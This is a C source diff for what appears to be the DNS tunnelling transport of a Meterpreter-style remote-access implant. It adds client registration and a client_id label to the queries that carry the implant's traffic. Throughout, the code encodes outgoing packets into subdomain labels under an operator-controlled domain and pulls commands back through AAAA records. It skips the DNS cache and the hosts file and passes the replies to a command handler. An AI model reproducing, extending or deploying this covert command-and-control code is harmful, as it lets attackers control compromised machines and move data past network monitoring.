@@ -89,6 +89,7 @@ DWORD WINAPI ThreadProc(DNSThreadParams *lpParam) {
     PIP4_ARRAY pSrvList = lpParam->pSrvList;
     wchar_t * domain = lpParam->domain;
     wchar_t * sub_seq = lpParam->subd;
+    wchar_t * client_id = lpParam->client_id;
     xxx[0] = NULL;
     int cur_idx = lpParam->index;
     //ReleaseMutex(lpParam->mutex);
@@ -113,6 +114,8 @@ DWORD WINAPI ThreadProc(DNSThreadParams *lpParam) {
             wcscat_s(request, 250, idx_sub);
             wcscat_s(request, 250, L".");
             wcscat_s(request, 250, sub_c);
+            wcscat_s(request, 250, L".");
+            wcscat_s(request, 250, client_id);
             wcscat_s(request, 250, L".");
             wcscat_s(request, 250, domain);
 
@@ -245,7 +248,7 @@ DWORD WINAPI ThreadProc(DNSThreadParams *lpParam) {
  * @param hReq DNS request domain.
  * @return An indication of the result of sending the request.
  */
-BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4, wchar_t* reqz)
+BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter,IncapuslatedDns *recieve, PIP4_ARRAY pip4, wchar_t* reqz, wchar_t* client_id)
 {
     
     DWORD tries = 1000;
@@ -278,6 +281,8 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
         wcscat_s(request, 250, reqz);
         wcscat_s(request, 250, L".");
         wcscat_s(request, 250, sub_c);
+        wcscat_s(request, 250, L".");
+        wcscat_s(request, 250, client_id);
         wcscat_s(request, 250, L".");
         wcscat_s(request, 250, domain);
 
@@ -370,6 +375,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
             UINT last_idx = curr_idx + ( y == (THREADS_MAX - 1) ? iterations_last : iterations );
             thread_params[y].mutex = &hMutex;
             thread_params[y].domain = domain;
+            thread_params[y].client_id = client_id;
             thread_params[y].subd = sub_seq_orig;
             thread_params[y].pSrvList = pip4;
             thread_params[y].result = (UCHAR *)calloc(238 * ( y == (THREADS_MAX - 1) ? iterations_last : iterations ), sizeof(UCHAR));
@@ -409,6 +415,7 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
                 
             //CLEAN 
             thread_params[y].domain = NULL;
+            thread_params[y].client_id = NULL;
             thread_params[y].subd = NULL;
             thread_params[y].status = 1;
             SAFE_FREE(thread_params[y].result);
@@ -461,12 +468,12 @@ BOOL get_packet_from_windns(wchar_t * domain, wchar_t * sub_seq, PUSHORT counter
  * @param size Buffer size.
  * @return An indication of the result of sending the request.
  */
-static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, IncapuslatedDns *recieved)
+static BOOL send_request_windns(wchar_t * domain, wchar_t * subdomain, wchar_t* reqz, PUSHORT counter, PIP4_ARRAY pip4, LPVOID buffer, DWORD size, wchar_t* client_id, IncapuslatedDns *recieved)
 {
     BOOL data = FALSE;
     
         if(buffer == NULL || size == 0){
-            data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz);
+            data = get_packet_from_windns(domain, subdomain, counter, recieved, pip4, reqz, client_id);
         } else if (buffer != NULL && size > 0) {
             data = FALSE;
         }
@@ -509,7 +516,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
     PUSHORT counter = &ctx->counter;
     PIP4_ARRAY pSrvList = (PIP4_ARRAY)ctx->pip4;
     wchar_t *domain = ctx->domain;
-
+    wchar_t *client_id = ctx->client_id;
     wchar_t *request = NULL;
 
     DWORD totalLength = packet->payloadLength + sizeof(PacketHeader);
@@ -528,7 +535,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
     memcpy(buffer, &packet->header, sizeof(PacketHeader));
     memcpy(buffer + sizeof(PacketHeader), packet->payload, packet->payloadLength);
     
-    size_t buffLen = packet->payloadLength + sizeof(PacketHeader);
+    DWORD  buffLen = packet->payloadLength + sizeof(PacketHeader);
     need_to_send = ((buffLen/5) + (buffLen % 5 > 0 ? 1 : 0)) * 8 ;
     
     base64 = (wchar_t *)calloc(need_to_send + 1, sizeof(wchar_t));
@@ -561,6 +568,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
         wcscat_s(request, MAX_DNS_NAME_SIZE, padd);
         wcscat_s(request, MAX_DNS_NAME_SIZE, L".tx.");
         wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
+        wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
+        wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
         wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
         wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
         force_stop = FALSE;
@@ -599,7 +608,7 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
             force_stop = FALSE;
 
             request = (wchar_t *)calloc(MAX_DNS_NAME_SIZE + 1, sizeof(wchar_t));
-            rest_len = MAX_DNS_NAME_SIZE - wcslen(domain) - 6 - wcslen(sub_c) - wcslen(idx_c);
+            rest_len = MAX_DNS_NAME_SIZE - ((DWORD)wcslen(domain)) - 7 - ((DWORD)wcslen(sub_c)) - ((DWORD)wcslen(idx_c)) - ((DWORD)wcslen(client_id));
             rest_len = min(rest_len, need_to_send - current_sent);
             parts = rest_len / (MAX_DNS_SUBNAME_SIZE + 1);
             parts_last = rest_len % (MAX_DNS_SUBNAME_SIZE + 1);
@@ -630,6 +639,8 @@ static DWORD packet_transmit_dns(Remote *remote, Packet *packet, PacketRequestCo
             wcscat_s(request, MAX_DNS_NAME_SIZE, idx_c);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
             wcscat_s(request, MAX_DNS_NAME_SIZE, sub_c);
+            wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
+            wcscat_s(request, MAX_DNS_NAME_SIZE, client_id);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L".");
             wcscat_s(request, MAX_DNS_NAME_SIZE, domain);
             wcscat_s(request, MAX_DNS_NAME_SIZE, L"\x00");
@@ -809,6 +820,109 @@ static DWORD packet_transmit_via_dns(Remote *remote, Packet *packet, PacketReque
 }
 
 /*!
+ * @brief Windows-specific function to register a new client via DNS.
+ * @param remote Pointer to the \c Remote instance.
+ * @param packet Pointer to a pointer that will receive the \c Packet data.
+ * @return An indication of the result of processing the transmission request.
+ * @remark This function is not available in POSIX.
+ */
+static DWORD register_dns(DnsTransportContext* ctx)
+{
+    DWORD tries = 10;
+
+    DnsTunnel* xxx[17];
+    wchar_t sub_c[7];
+    //UINT current_recieved = 0;
+    //UINT need_to_recieve = 0;
+    BOOL ready = FALSE;
+    DNS_STATUS dns_status;
+    PDNS_RECORD result = NULL;
+    PDNS_RECORD result_iter = NULL;
+    wchar_t *request;
+    PUSHORT counter = &ctx->counter;
+    //wchar_t *sub_seq_orig = _wcsdup(sub_seq);
+    
+    xxx[0] = NULL;
+
+    do {
+        request = (wchar_t *)calloc(250, sizeof(wchar_t));
+
+        for (int i = 1; i < 17; i++){
+            xxx[i] = NULL;
+        }
+
+        _itow_s(*counter, sub_c, 6, 10);
+        ++(*counter);
+
+        wcscat_s(request, 250, L"7812.reg0.");
+        wcscat_s(request, 250, sub_c);
+        wcscat_s(request, 250, L".");
+        wcscat_s(request, 250, ctx->server_id);
+        wcscat_s(request, 250, L".");
+        wcscat_s(request, 250, ctx->domain);
+
+        vdprintf("[PACKET RECEIVE WINDNS] request: %S", request);
+        dns_status = DnsQuery_W(request, DNS_TYPE_AAAA, DNS_QUERY_RETURN_MESSAGE|DNS_QUERY_BYPASS_CACHE|DNS_QUERY_NO_HOSTS_FILE, ctx->pip4, &result, NULL);
+        
+        SAFE_FREE(request);
+        vdprintf("[PACKET RECEIVE WINDNS] DnsQuery status code is %d", dns_status);
+        
+        if (dns_status != 0) {
+            
+            tries--;
+            continue;
+        }
+
+        if (result->Data.AAAA.Ip6Address.IP6Byte != NULL) {
+            
+
+            result_iter = (PDNS_RECORD)calloc(1, sizeof(DNS_RECORD));
+            result_iter->pNext = result;
+            
+            do {
+                result_iter = result_iter->pNext;
+                DnsTunnel* tmp = ((DnsTunnel *)result_iter->Data.AAAA.Ip6Address.IP6Byte);
+
+
+                if ((UCHAR)(tmp->index_size) == 0xff && tmp->ff == 0xff)
+                {
+                    xxx[0] = tmp;
+                    break;
+                }
+
+            } while (result_iter->pNext != NULL);
+
+            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%x'", xxx[0]->block.data[0]);
+            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID0: '%c'", xxx[0]->block.data[0]);
+            vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID1: '%x'", xxx[0]->block.data[1]);
+
+            if (xxx[0] != NULL && xxx[0]->block.data[1] == 0){
+                vdprintf("[PACKET RECEIVE WINDNS] CLIENT ID: '%x'", xxx[0]->block.data[0]);
+                if(ctx->client_id) SAFE_FREE(ctx->client_id);
+                ctx->client_id= (wchar_t*)calloc(2,sizeof(wchar_t));
+                swprintf(ctx->client_id, 2*sizeof(wchar_t), L"%c", xxx[0]->block.data[0]);
+                ctx->ready = TRUE;
+                break;
+            }
+            else 
+            {
+                vdprintf("[PACKET RECEIVE WINDNS] HEADER NOT FOUND error");
+                tries--;
+                continue;
+            }
+        }
+        else {
+            vdprintf("[PACKET RECEIVE WINDNS] NO IP");
+            tries--;
+            continue;
+        }
+    } while (tries > 0);   
+    
+    
+    return ctx->ready;
+}
+
+/*!
  * @brief Windows-specific function to receive a new packet via DNS.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to a pointer that will receive the \c Packet data.
@@ -837,7 +951,7 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
     
     if (ctx->ready == TRUE){
         vdprintf("[PACKET RECEIVE DNS] sending req: %S", ctx->domain);
-        BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, &recieved);
+        BOOL rcvStatus = send_request_windns(ctx->domain, sub_seq, L"g", &ctx->counter, ctx->pip4, NULL, 0, ctx->client_id, &recieved);
 
         if (rcvStatus == TRUE && recieved.status == ERROR_SUCCESS) // Handle response
         {
@@ -946,11 +1060,22 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
             res = ERROR_READ_FAULT;
             
         }
-    } else { // Transport not ready
+    } else { // Register
         
-        SetLastError(ERROR_NOT_READY);
-        res = ERROR_NOT_READY;
-        
+        vdprintf("[PACKET RECEIVE DNS] sending reg req: %S", ctx->domain);
+        BOOL rcvStatus = register_dns(ctx);
+
+        if (rcvStatus == TRUE) // Handle response
+        {
+            vdprintf("[PACKET RECEIVE DNS] Registred. New CLIENT ID: '%s'", ctx->client_id);
+            SetLastError(DNS_INFO_NO_RECORDS);
+            res = DNS_INFO_NO_RECORDS;
+        } else {
+            vdprintf("[PACKET RECEIVE DNS] Registration failed!");
+            SetLastError(DNS_INFO_NO_RECORDS);
+            res = DNS_INFO_NO_RECORDS;
+            
+        }
     }
     
     lock_release(remote->lock);
@@ -967,17 +1092,17 @@ static DWORD packet_receive_dns(Remote *remote, Packet **packet)
 static BOOL server_init_windns(Transport* transport)
 {
     DnsTransportContext* ctx = (DnsTransportContext*)transport->ctx;
-    LPWSADATA wsaData;
+    //LPWSADATA wsaData;
     PIP4_ARRAY pSrvList = NULL;
     
     dprintf("[WINDNS] Initialising ...");
     
-    wsaData = (LPWSADATA)calloc(1, sizeof(WSADATA));
+    //wsaData = (LPWSADATA)calloc(1, sizeof(WSADATA));
     
-    if ( (WSAStartup(MAKEWORD(2, 2), wsaData))!= 0) {
-        dprintf("[WINDNS] WSAStartup failed");
-        return FALSE;
-    }
+    //if ( (WSAStartup(MAKEWORD(2, 2), wsaData))!= 0) {
+    //    dprintf("[WINDNS] WSAStartup failed");
+    //    return FALSE;
+    //}
     
     
     if (ctx->ns_server!= NULL && wcscmp(ctx->ns_server, L"") != 0){
@@ -998,8 +1123,13 @@ static BOOL server_init_windns(Transport* transport)
     //ctx->hints.ai_family = AF_INET6;
     //ctx->hints.ai_socktype = SOCK_STREAM;
     
-    ctx->ready = TRUE;
-    dprintf("[WINDNS] DNS Ready");
+    if (ctx->client_id == NULL || ctx->client_id[0] == L'\0' || ctx->client_id[0] == L'0'){
+        dprintf("[WINDNS] DNS Ready for reg");
+        ctx->ready = FALSE;
+    } else {
+        dprintf("[WINDNS] DNS already registred with CLIENT_ID %S", ctx->client_id);
+        ctx->ready = TRUE;         
+    }
 
     return TRUE;
 }
@@ -1062,8 +1192,10 @@ static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
         }
 
         dprintf("[DISPATCH] Reading data from the DNS: %S", ctx->domain);
+      
+      
         result = packet_receive_dns(remote, &packet);
-
+        
         if (result != ERROR_SUCCESS)
         {
             // Update the timestamp for empty replies
@@ -1071,30 +1203,25 @@ static DWORD server_dispatch_dns(Remote* remote, THREAD* dispatchThread)
             {
                 transport->comms_last_packet = current_unix_timestamp();
             }
-
             delay = 10 * ecount;
             if (ecount >= 10)
             {
                 delay *= 10;
             }
-
             ecount++;
-
             dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
             Sleep(min(10000, delay));
         }
         else
         {
             transport->comms_last_packet = current_unix_timestamp();
-
             // Reset the empty count when we receive a packet
             ecount = 0;
-
             dprintf("[DISPATCH] Returned result: %d, %x", result,packet);
-
             running = command_handle(remote, packet);
             dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
         }
+  
     }
 
     return result;
@@ -1119,6 +1246,9 @@ static void transport_destroy_dns(Transport* transport)
             if(ctx->ns_server){
                 SAFE_FREE(ctx->ns_server);
             }
+            if(ctx->server_id){
+                SAFE_FREE(ctx->server_id);
+            }
             if(ctx->pip4){
                 SAFE_FREE(ctx->pip4)
             }
@@ -1139,6 +1269,14 @@ void transport_write_dns_config(Transport* transport, MetsrvTransportDns* config
     if (ctx->ns_server)
     {
         wcsncpy(config->ns_server, ctx->ns_server, NS_NAME_SIZE);
+    }
+    if (ctx->client_id)
+    {
+        wcsncpy(config->client_id, ctx->client_id, 2);
+    }
+    if (ctx->server_id)
+    {
+        wcsncpy(config->server_id, ctx->server_id, 256);
     }
     /*
     if (ctx->domain)
@@ -1187,7 +1325,8 @@ Transport* transport_create_dns(MetsrvTransportDns* config)
     }    
     
     ctx->domain = _wcsdup(domain + 6);
-    
+    ctx->client_id = _wcsdup(config->client_id);
+    ctx->server_id = _wcsdup(config->server_id);
     ctx->ns_server = _wcsdup(config->ns_server);
     //ctx->type = config->type;
     ctx->counter = 0; //TODO: GET COUNTER FROM THE CONFIG
